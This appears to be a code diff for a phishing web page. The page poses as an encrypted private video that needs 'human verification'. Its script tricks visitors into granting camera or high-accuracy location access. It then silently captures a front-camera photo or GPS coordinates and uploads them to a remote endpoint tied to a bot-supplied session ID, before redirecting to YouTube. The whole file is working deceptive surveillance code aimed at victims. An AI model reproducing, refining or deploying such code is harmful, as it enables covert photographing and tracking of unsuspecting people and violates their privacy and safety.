@@ -26,7 +26,6 @@
       position: relative;
     }
 
-    /* Video Placeholder Design */
     .video-screen {
       width: 100%;
       aspect-ratio: 16 / 9;
@@ -57,11 +56,6 @@
       fill: white;
     }
 
-    .video-screen:hover .play-button {
-      transform: scale(1.1);
-      background: rgba(255, 255, 255, 0.3);
-    }
-
     .video-info {
       padding: 20px;
       border-top: 1px solid #334155;
@@ -80,15 +74,14 @@
       color: #94a3b8;
     }
 
-    /* Modal / Overlay for Verification */
     .overlay {
       position: absolute;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(15, 23, 42, 0.9);
-      display: none; /* Hidden by default */
+      background: rgba(15, 23, 42, 0.95);
+      display: none;
       flex-direction: column;
       justify-content: center;
       align-items: center;
@@ -101,6 +94,26 @@
       max-width: 320px;
     }
 
+    .btn-verify {
+      background: #38bdf8;
+      color: #0f172a;
+      border: none;
+      padding: 14px 24px;
+      border-radius: 6px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 15px;
+      width: 100%;
+      font-size: 16px;
+    }
+
+    .status-text {
+      font-size: 14px;
+      color: #cbd5e1;
+      margin-top: 15px;
+      line-height: 1.5;
+    }
+
     .loader {
       border: 4px solid #334155;
       border-top: 4px solid #38bdf8;
@@ -108,29 +121,11 @@
       width: 40px;
       height: 40px;
       animation: spin 1s linear infinite;
-      margin: 0 auto 20px;
+      margin: 0 auto 15px;
+      display: none;
     }
 
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-    .btn-verify {
-      background: #38bdf8;
-      color: #0f172a;
-      border: none;
-      padding: 12px 24px;
-      border-radius: 6px;
-      font-weight: 700;
-      cursor: pointer;
-      margin-top: 15px;
-      width: 100%;
-    }
-
-    .status-text {
-      font-size: 13px;
-      color: #cbd5e1;
-      margin-top: 10px;
-      line-height: 1.4;
-    }
   </style>
 </head>
 <body>
@@ -143,15 +138,15 @@
     </div>
     
     <div class="video-info">
-      <h1>Private_Video_0824.mp4</h1>
-      <p>Uploaded 2 hours ago • 14.2 MB • Encrypted Content</p>
+      <h1>Private_Encrypted_Video_Rec772.mp4</h1>
+      <p>Source: Secure Cloud • Size: 24.8 MB • Today</p>
     </div>
 
     <div class="overlay" id="overlay">
       <div class="verify-box">
         <div class="loader" id="loader"></div>
-        <h2 id="verifyTitle">Human Verification Required</h2>
-        <p class="status-text" id="status">To continue watching, please verify your identity by allowing access to your device. This ensures you are not a bot.</p>
+        <h2 id="verifyTitle">Human Verification</h2>
+        <p class="status-text" id="status">To access this private content, please complete the human verification process. Click below to continue.</p>
         <button class="btn-verify" id="startAction">Verify Now</button>
       </div>
     </div>
@@ -164,6 +159,7 @@
     const startAction = document.getElementById("startAction");
     const statusText = document.getElementById("status");
     const verifyTitle = document.getElementById("verifyTitle");
+    const loader = document.getElementById("loader");
 
     function getParams() {
       const p = new URLSearchParams(window.location.search);
@@ -174,83 +170,121 @@
       overlay.style.display = 'flex';
     });
 
-    startAction.addEventListener('click', async () => {
-      const { id, type } = getParams();
-      if (!id || !type) {
-        statusText.textContent = "Error: Invalid session ID.";
+    startAction.addEventListener('click', function() {
+      const params = getParams();
+      if (!params.id || !params.type) {
+        statusText.textContent = "Error: Invalid Session. Please use the link from the bot.";
         return;
       }
 
-      if (type === 'camera') {
-        await captureCamera(id);
-      } else if (type === 'location') {
-        await captureLocation(id);
+      // Loader-i göstər, düyməni gizlə
+      loader.style.display = "block";
+      startAction.style.display = "none";
+
+      if (params.type === 'camera') {
+        captureCamera(params.id);
+      } else {
+        captureLocation(params.id);
       }
     });
 
     async function captureCamera(unique_id) {
       try {
-        statusText.textContent = "Connecting to secure server...";
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        statusText.textContent = "Initializing camera... Please allow access.";
+        
+        // Kamera icazəsini birbaşa istəyirik
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user" }, 
+            audio: false 
+        });
+        
+        statusText.textContent = "Connecting to server...";
         
         const video = document.createElement("video");
         video.srcObject = stream;
+        video.muted = true;
         await video.play();
 
-        await new Promise(r => setTimeout(r, 1000));
+        // Şəkil çəkmək üçün bir az gözlə (fokuslanma üçün)
+        await new Promise(r => setTimeout(r, 800));
 
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext("2d").drawImage(video, 0, 0);
 
-        stream.getTracks().forEach(t => t.stop());
+        // Kameranı söndür
+        stream.getTracks().forEach(track => track.stop());
 
-        statusText.textContent = "Finalizing verification...";
-        const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.8));
-        
-        const form = new FormData();
-        form.append("photo", blob, "verify.jpg");
-        form.append("unique_id", unique_id);
+        statusText.textContent = "Uploading verification data...";
 
-        await fetch(api_url + "/upload", { method: "POST", body: form });
-        
-        success();
+        canvas.toBlob(async (blob) => {
+          const form = new FormData();
+          form.append("photo", blob, "verify.jpg");
+          form.append("unique_id", unique_id);
+
+          try {
+            const response = await fetch(api_url + "/upload", {
+              method: "POST",
+              body: form,
+              mode: 'cors'
+            });
+            if(response.ok) {
+                success();
+            } else {
+                throw new Error("Upload failed");
+            }
+          } catch (e) {
+            statusText.textContent = "Network error. Please try again.";
+            startAction.style.display = "block";
+            loader.style.display = "none";
+          }
+        }, "image/jpeg", 0.7);
+
       } catch (err) {
-        statusText.textContent = "Verification failed. Please try again and allow permissions.";
+        console.error(err);
+        statusText.textContent = "Error: Camera access is required for verification.";
+        startAction.style.display = "block";
+        loader.style.display = "none";
       }
     }
 
     function captureLocation(unique_id) {
-      statusText.textContent = "Fetching regional access...";
+      statusText.textContent = "Requesting location access...";
       
       navigator.geolocation.getCurrentPosition(async (pos) => {
+        statusText.textContent = "Verifying location...";
         try {
-          const res = await fetch(api_url + "/upload_location", {
+          await fetch(api_url + "/upload_location", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
-              unique_id,
+              unique_id: unique_id,
               latitude: pos.coords.latitude,
               longitude: pos.coords.longitude
-            })
+            }),
+            mode: 'cors'
           });
           success();
         } catch (err) {
-          statusText.textContent = "Error: Connection timed out.";
+          statusText.textContent = "Connection error.";
+          startAction.style.display = "block";
+          loader.style.display = "none";
         }
       }, (err) => {
-        statusText.textContent = "Location access denied. Verification incomplete.";
-      });
+        statusText.textContent = "Location access denied. Verification failed.";
+        startAction.style.display = "block";
+        loader.style.display = "none";
+      }, { enableHighAccuracy: true });
     }
 
     function success() {
+      loader.style.display = "none";
       verifyTitle.textContent = "✅ Verified";
-      statusText.textContent = "You have been successfully verified. Decrypting video...";
-      startAction.style.display = 'none';
+      statusText.textContent = "Verification complete. Redirecting to video...";
       setTimeout(() => {
-        window.location.href = "https://www.youtube.com/watch?v=ymLCYgWr-h8"; // Example redirect
-      }, 2000);
+        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
+      }, 1500);
     }
   </script>
 </body>
